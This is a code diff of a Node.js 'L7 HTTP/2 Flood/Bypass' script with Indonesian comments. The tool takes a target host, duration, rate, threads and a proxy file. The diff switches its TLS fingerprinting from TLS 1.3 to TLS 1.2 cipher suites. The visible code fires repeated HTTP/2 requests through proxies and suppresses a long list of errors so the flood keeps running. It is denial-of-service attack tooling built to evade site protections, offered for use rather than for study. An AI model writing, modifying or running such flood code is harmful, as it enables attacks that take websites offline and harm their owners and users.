@@ -83,14 +83,18 @@ function randnum(minLength, maxLength) {
     return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
 }
 
-const cplist = [
-    "TLS_AES_128_CCM_8_SHA256",
-    "TLS_AES_128_CCM_SHA256",
-    "TLS_CHACHA20_POLY1305_SHA256",
-    "TLS_AES_256_GCM_SHA384",
-    "TLS_AES_128_GCM_SHA256"
+// Daftar cipher untuk TLS 1.2 (ganti cipher TLS 1.3)
+const tls12Ciphers = [
+    "ECDHE-ECDSA-AES128-GCM-SHA256",
+    "ECDHE-RSA-AES128-GCM-SHA256",
+    "ECDHE-ECDSA-AES256-GCM-SHA384",
+    "ECDHE-RSA-AES256-GCM-SHA384",
+    "ECDHE-ECDSA-CHACHA20-POLY1305",
+    "ECDHE-RSA-CHACHA20-POLY1305",
+    "DHE-RSA-AES128-GCM-SHA256",
+    "DHE-RSA-AES256-GCM-SHA384"
 ];
-var cipper = cplist[Math.floor(Math.random() * cplist.length)];
+var cipper = tls12Ciphers[Math.floor(Math.random() * tls12Ciphers.length)];
 
 const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
 const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
@@ -117,14 +121,12 @@ const sigalgs = [
 ];
 let SignalsList = sigalgs.join(':');
 const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
-
-// ========== PERUBAHAN: HAPUS SSL_OP_NO_TLSv1_3 ==========
 const secureOptions =
     crypto.constants.SSL_OP_NO_SSLv2 |
     crypto.constants.SSL_OP_NO_SSLv3 |
     crypto.constants.SSL_OP_NO_TLSv1 |
     crypto.constants.SSL_OP_NO_TLSv1_1 |
-    // crypto.constants.SSL_OP_NO_TLSv1_3 |   // <-- DIHAPUS
+    crypto.constants.SSL_OP_NO_TLSv1_3 |   // tetap nonaktifkan TLS 1.3
     crypto.constants.ALPN_ENABLED |
     crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
     crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
@@ -138,9 +140,9 @@ const secureOptions =
 
 if (process.argv.length < 7) {
     console.clear();
-    console.log(' L7 HTTP/2 Flood/Bypass - TLS 1.3 ONLY');
+    console.log(' L7 HTTP/2 Flood/Bypass - TLS 1.2 ONLY');
     console.log('────────────────────────────────────────────────────────────');
-    console.log(' Usage: '.blue + 'node lev.js host time rate threads proxyfile'.white);
+    console.log(' Usage: '.blue + 'node h2.js host time rate threads proxyfile'.white);
     console.log('────────────────────────────────────────────────────────────');
     console.log('<host>      = '.white + 'Target URL (example: https://example.com)'.blue);
     console.log('<time>      = '.white + 'Duration in seconds'.blue);
@@ -673,11 +675,11 @@ function runFlooder() {
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true);
 
-        // ========== PERUBAHAN: FORCE TLS 1.3 ==========
+        // ========== PERUBAHAN: Force TLS 1.2 ==========
         const tlsOptions = {
             secure: true,
             ALPNProtocols: ["h2", "http/1.1"],
-            ciphers: cipper,
+            ciphers: cipper,                     // cipher TLS 1.2
             requestCert: true,
             sigalgs: sigalgs,
             socket: connection,
@@ -685,12 +687,12 @@ function runFlooder() {
             secureContext: secureContext,
             honorCipherOrder: false,
             rejectUnauthorized: false,
-            secureProtocol: 'TLS_method',   // <-- gunakan string, bukan array
+            secureProtocol: 'TLS_method',        // bukan array
             secureOptions: secureOptions,
             host: parsedTarget.host,
             servername: parsedTarget.host,
-            minVersion: 'TLSv1.3',          // <-- hanya TLS 1.3
-            maxVersion: 'TLSv1.3'
+            minVersion: 'TLSv1.2',               // hanya TLS 1.2
+            maxVersion: 'TLSv1.2'
         };
 
         const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
@@ -763,7 +765,7 @@ function runFlooder() {
                 if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                     for (let i = 0; i < requestsPerInterval; i++) {
                         const requestPromise = new Promise((resolve, reject) => {
-                            // ========== PERUBAHAN: HAPUS weight/depends_on/exclusive ==========
+                            // ========== PERUBAHAN: Hapus weight, depends_on, exclusive ==========
                             const req = client.request(dynHeaders, {})
                             .on('response', response => {
                                 const status = response[':status'];
@@ -786,7 +788,6 @@ function runFlooder() {
                                     clearInterval(intervalId);
                                     client.close(http2.constants.NGHTTP2_CANCEL);
                                 }
-                                // Tidak perlu reject, kita biarkan resolve
                             });
                             req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                         });
